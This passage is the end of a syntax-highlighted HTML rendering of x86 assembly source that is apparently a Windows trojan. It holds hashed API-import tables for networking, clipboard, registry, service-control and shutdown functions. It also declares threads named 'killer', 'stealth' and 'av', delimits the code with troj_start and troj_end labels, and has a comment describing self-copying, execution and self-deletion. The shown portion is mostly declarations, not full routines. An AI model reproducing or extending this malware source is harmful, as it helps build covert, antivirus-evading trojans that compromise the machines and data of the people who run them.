</span><span class="sc5">_ExitProcess</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">No_api_kernel32</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">address_table_kernel32</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">hash_table_shlwapi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">SHSetValueA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SHGetValueA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SHDeleteKeyA</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">address_table_shlwapi</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_SHSetValueA</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SHGetValueA</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_SHDeleteKeyA</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">No_api_shlwapi</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">address_table_shlwapi</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">hash_table_user32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">PeekMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wsprintfA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetForegroundWindow</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MessageBeep</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IsIconic</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CloseWindow</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">PostMessageA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetOpenClipboardWindow</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OpenClipboard</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EmptyClipboard</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CloseClipboard</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ExitWindowsEx</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">EnumWindows</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetWindowThreadProcessId</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetWindowTextA</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">address_table_user32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_PeekMessageA</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_MessageBoxA</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_wsprintfA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetForegroundWindow</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_MessageBeep</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_IsIconic</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CloseWindow</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_PostMessageA</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetOpenClipboardWindow</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_OpenClipboard</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_EmptyClipboard</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CloseClipboard</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_ExitWindowsEx</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_EnumWindows</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetWindowThreadProcessId</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GetWindowTextA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">No_api_user32</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">address_table_user32</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">hash_table_wininet</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">InternetGetConnectedState</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InternetOpenA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InternetCloseHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InternetOpenUrlA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InternetQueryDataAvailable</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">InternetReadFile</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">address_table_wininet</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_InternetGetConnectedState</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_InternetOpenA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_InternetCloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_InternetOpenUrlA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_InternetQueryDataAvailable</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_InternetReadFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">No_api_wininet</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">address_table_wininet</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">hash_table_wsock32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">WSAStartup</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WSACleanup</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WSAGetLastError</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">connect</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">setsockopt</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">gethostname</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">htons</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bind</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">listen</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">accept</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">select</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">inet_ntoa</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">htonl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">inet_addr</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">address_table_wsock32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_WSAStartup</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_WSACleanup</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_socket</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_closesocket</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_gethostbyname</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_WSAGetLastError</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_recv</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_connect</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_send</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_setsockopt</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_gethostname</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_htons</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_bind</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_listen</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_accept</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_select</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_inet_ntoa</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_htonl</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_inet_addr</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">No_api_wsock32</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">address_table_wsock32</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">hash_table_advapi32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">OpenSCManagerA</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">address_table_advapi32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_OpenSCManagerA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">No_api_advapi32</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">address_table_advapi32</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">hash_table_msvcrt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">atoi</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">address_table_msvcrt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_atoi</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">No_api_msvcrt</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">address_table_msvcrt</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">hash_table_winmm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">mciSendStringA</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">address_table_winmm</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_mciSendStringA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">No_api_winmm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">address_table_winmm</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">log_handle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">inet_threadz</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">INET_THREADZ_COUNT</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">h_killer_thread</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">h_stealth_thread</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">h_stealth_thread2</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">h_av_thread</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">heap_handle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kernel</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_onlyne_flag</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_traced</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                   
</span><span class="sc5">_which_gen</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; 0 -&gt; first time -&gt; set mark to 1 -&gt; create a copy and execute it -&gt; self-delete</span><span class="sc0">
                                    </span><span class="sc1">; 1 -&gt; set mark to 2 -&gt; adjust startkey -&gt; continue with execution</span><span class="sc0">
                                    </span><span class="sc1">; 2-&gt; phase 2 is already in progress.. self-delete and exit peacefully</span><span class="sc0">
</span><span class="sc5">DLL_INIT</span><span class="sc0"> </span><span class="sc5">kernel32</span><span class="sc0">                           </span><span class="sc1">; initialize dll records</span><span class="sc0">
</span><span class="sc5">DLL_INIT</span><span class="sc0"> </span><span class="sc5">shlwapi</span><span class="sc0">
</span><span class="sc5">DLL_INIT</span><span class="sc0"> </span><span class="sc5">user32</span><span class="sc0">
</span><span class="sc5">DLL_INIT</span><span class="sc0"> </span><span class="sc5">wininet</span><span class="sc0">
</span><span class="sc5">DLL_INIT</span><span class="sc0"> </span><span class="sc5">wsock32</span><span class="sc0">
</span><span class="sc5">DLL_INIT</span><span class="sc0"> </span><span class="sc5">advapi32</span><span class="sc0">
</span><span class="sc5">DLL_INIT</span><span class="sc0"> </span><span class="sc5">msvcrt</span><span class="sc0">
</span><span class="sc5">DLL_INIT</span><span class="sc0"> </span><span class="sc5">winmm</span><span class="sc0">

</span><span class="sc5">troj_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">troj_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">troj_start</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc5">maplib</span><span class="sc0">\</span><span class="sc5">fioexlow.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc5">maplib</span><span class="sc0">\</span><span class="sc5">fioex.inc</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">end</span></div></body>
</html>
